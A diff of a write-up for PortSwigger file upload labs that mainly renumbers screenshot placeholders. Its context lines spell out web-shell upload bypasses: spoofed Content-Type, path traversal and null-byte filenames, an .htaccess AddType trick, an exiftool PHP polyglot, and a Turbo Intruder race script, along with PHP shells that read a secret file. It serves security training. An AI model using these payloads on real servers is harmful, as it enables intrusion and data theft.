@@ -65,15 +65,19 @@ The server rejects `.php` uploads unless the part's `Content-Type` is `image/jpe
 Content-Type: image/jpeg
 ```
 
+> **Picture goes here (#5).** Capture this request/response or command step in Burp/terminal. Key line: `Content-Type: image/jpeg`.
+> _Save as_ `images/portswigger-file-upload-labs/5.png` _then replace this block with_ `![Lab 2 — Web shell upload via Content-Type restriction bypass](/images/portswigger-file-upload-labs/5.png)`_._
+
+
 3. Send — the file is accepted.
 4. Request `GET /files/avatars/exploit.php` to execute it.
 
-> **Picture goes here (#5).** The modified multipart request with `Content-Type: image/jpeg` and the PHP body.
-> _Save as_ `images/portswigger-file-upload-labs/5.png` _then replace this block with_ `![Lab 2 — Web shell upload via Content-Type restriction bypass](/images/portswigger-file-upload-labs/5.png)`_._
+> **Picture goes here (#6).** The modified multipart request with `Content-Type: image/jpeg` and the PHP body.
+> _Save as_ `images/portswigger-file-upload-labs/6.png` _then replace this block with_ `![Lab 2 — Web shell upload via Content-Type restriction bypass](/images/portswigger-file-upload-labs/6.png)`_._
 
 ## Lab 3 — Web shell upload via path traversal
-> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`.
-> _Save as_ `images/portswigger-file-upload-labs/6.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/6.png)`_._
+> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`.
+> _Save as_ `images/portswigger-file-upload-labs/7.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/7.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -90,21 +94,29 @@ Here the server does not block `.php`, but files in `/files/avatars/` are served
 Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
 ```
 
+> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`.
+> _Save as_ `images/portswigger-file-upload-labs/8.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/8.png)`_._
+
+
 3. The response says `avatars/exploit.php` — the traversal was stripped. Bypass by URL-encoding the slash:
 
 ```http
 Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
 ```
 
+> **Picture goes here (#9).** Capture this request/response or command step in Burp/terminal. Key line: `Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"`.
+> _Save as_ `images/portswigger-file-upload-labs/9.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/9.png)`_._
+
+
 4. The response now says `avatars/../exploit.php`, i.e. the file landed in `/files/`.
 5. Request `GET /files/exploit.php` (or `GET /files/avatars/..%2fexploit.php`) to execute it.
 
-> **Picture goes here (#7).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/portswigger-file-upload-labs/7.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/7.png)`_._
+> **Picture goes here (#10).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-file-upload-labs/10.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/10.png)`_._
 
 ## Lab 4 — Web shell upload via extension blacklist bypass
-> **Picture goes here (#8).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `AddType application/x-httpd-php .l33t`.
-> _Save as_ `images/portswigger-file-upload-labs/8.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/8.png)`_._
+> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `AddType application/x-httpd-php .l33t`.
+> _Save as_ `images/portswigger-file-upload-labs/11.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/11.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -120,20 +132,28 @@ The response headers reveal **Apache** with `mod_php`. Rather than fight the bla
 AddType application/x-httpd-php .l33t
 ```
 
+> **Picture goes here (#12).** Capture this step in the decompiler/editor or terminal. Key line: `AddType application/x-httpd-php .l33t`.
+> _Save as_ `images/portswigger-file-upload-labs/12.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/12.png)`_._
+
+
 2. Upload the shell renamed `exploit.l33t`:
 
 ```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
+> **Picture goes here (#13).** Capture this step in the decompiler/editor or terminal. Key line: `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
+> _Save as_ `images/portswigger-file-upload-labs/13.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/13.png)`_._
+
+
 3. Request `GET /files/avatars/exploit.l33t`. Mod_php now treats `.l33t` as PHP and runs it.
 
-> **Picture goes here (#9).** The `.htaccess` upload followed by the executed `.l33t` shell.
-> _Save as_ `images/portswigger-file-upload-labs/9.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/9.png)`_._
+> **Picture goes here (#14).** The `.htaccess` upload followed by the executed `.l33t` shell.
+> _Save as_ `images/portswigger-file-upload-labs/14.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/14.png)`_._
 
 ## Lab 5 — Web shell upload via obfuscated file extension
-> **Picture goes here (#10).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"`.
-> _Save as_ `images/portswigger-file-upload-labs/10.png` _then replace this block with_ `![Lab 5 — Web shell upload via obfuscated file extension](/images/portswigger-file-upload-labs/10.png)`_._
+> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"`.
+> _Save as_ `images/portswigger-file-upload-labs/15.png` _then replace this block with_ `![Lab 5 — Web shell upload via obfuscated file extension](/images/portswigger-file-upload-labs/15.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -149,17 +169,21 @@ The filter validates the trailing extension but is vulnerable to a **null byte**
 Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
 ```
 
+> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"`.
+> _Save as_ `images/portswigger-file-upload-labs/16.png` _then replace this block with_ `![Lab 5 — Web shell upload via obfuscated file extension](/images/portswigger-file-upload-labs/16.png)`_._
+
+
 2. The response reports `exploit.php` was uploaded — the null byte and `.jpg` were stripped by the filesystem.
 3. Request `GET /files/avatars/exploit.php` to execute the shell.
 
 > **Note:** This works against older PHP/Java runtime combinations where the null byte is not handled safely. Modern runtimes reject it, which is exactly why understanding *why* it worked matters.
 
-> **Picture goes here (#11).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/portswigger-file-upload-labs/11.png` _then replace this block with_ `![Lab 5 — Web shell upload via obfuscated file extension](/images/portswigger-file-upload-labs/11.png)`_._
+> **Picture goes here (#17).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-file-upload-labs/17.png` _then replace this block with_ `![Lab 5 — Web shell upload via obfuscated file extension](/images/portswigger-file-upload-labs/17.png)`_._
 
 ## Lab 6 — Remote code execution via polyglot web shell upload
-> **Picture goes here (#12).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'`.
-> _Save as_ `images/portswigger-file-upload-labs/12.png` _then replace this block with_ `![Lab 6 — Remote code execution via polyglot web shell upload](/images/portswigger-file-upload-labs/12.png)`_._
+> **Picture goes here (#18).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'`.
+> _Save as_ `images/portswigger-file-upload-labs/18.png` _then replace this block with_ `![Lab 6 — Remote code execution via polyglot web shell upload](/images/portswigger-file-upload-labs/18.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -175,15 +199,19 @@ This lab fully validates that the upload is a real image, so extension tricks fa
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
 ```
 
+> **Picture goes here (#19).** Capture this request/response or command step in Burp/terminal. Key line: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'`.
+> _Save as_ `images/portswigger-file-upload-labs/19.png` _then replace this block with_ `![Lab 6 — Remote code execution via polyglot web shell upload](/images/portswigger-file-upload-labs/19.png)`_._
+
+
 2. Upload `polyglot.php` (it passes as a valid image).
 3. In Burp, find `GET /files/avatars/polyglot.php` and search the binary response for `START` … `END`. The secret sits between them.
 
-> **Picture goes here (#13).** The polyglot response with `START <secret> END` in the image data.
-> _Save as_ `images/portswigger-file-upload-labs/13.png` _then replace this block with_ `![Lab 6 — Remote code execution via polyglot web shell upload](/images/portswigger-file-upload-labs/13.png)`_._
+> **Picture goes here (#20).** The polyglot response with `START <secret> END` in the image data.
+> _Save as_ `images/portswigger-file-upload-labs/20.png` _then replace this block with_ `![Lab 6 — Remote code execution via polyglot web shell upload](/images/portswigger-file-upload-labs/20.png)`_._
 
 ## Lab 7 — Web shell upload via race condition
-> **Picture goes here (#14).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `def queueRequests(target, wordlists):`.
-> _Save as_ `images/portswigger-file-upload-labs/14.png` _then replace this block with_ `![Lab 7 — Web shell upload via race condition](/images/portswigger-file-upload-labs/14.png)`_._
+> **Picture goes here (#21).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `def queueRequests(target, wordlists):`.
+> _Save as_ `images/portswigger-file-upload-labs/21.png` _then replace this block with_ `![Lab 7 — Web shell upload via race condition](/images/portswigger-file-upload-labs/21.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -215,11 +243,15 @@ def handleResponse(req, interesting):
     table.add(req)
 ```
 
+> **Picture goes here (#22).** Capture this step in the decompiler/editor or terminal. Key line: `def queueRequests(target, wordlists):`.
+> _Save as_ `images/portswigger-file-upload-labs/22.png` _then replace this block with_ `![Lab 7 — Web shell upload via race condition](/images/portswigger-file-upload-labs/22.png)`_._
+
+
 4. Replace `<YOUR-POST-REQUEST>` with the full avatar upload containing `exploit.php`, and `<YOUR-GET-REQUEST>` with `GET /files/avatars/exploit.php`.
 5. Click **Attack**. Some of the GETs return HTTP 200 with the secret — they hit the file after it was written but before the scanner removed it.
 
-> **Picture goes here (#15).** Turbo Intruder results showing 200 responses containing the secret.
-> _Save as_ `images/portswigger-file-upload-labs/15.png` _then replace this block with_ `![Lab 7 — Web shell upload via race condition](/images/portswigger-file-upload-labs/15.png)`_._
+> **Picture goes here (#23).** Turbo Intruder results showing 200 responses containing the secret.
+> _Save as_ `images/portswigger-file-upload-labs/23.png` _then replace this block with_ `![Lab 7 — Web shell upload via race condition](/images/portswigger-file-upload-labs/23.png)`_._
 
 ## Bypass cheat sheet
 
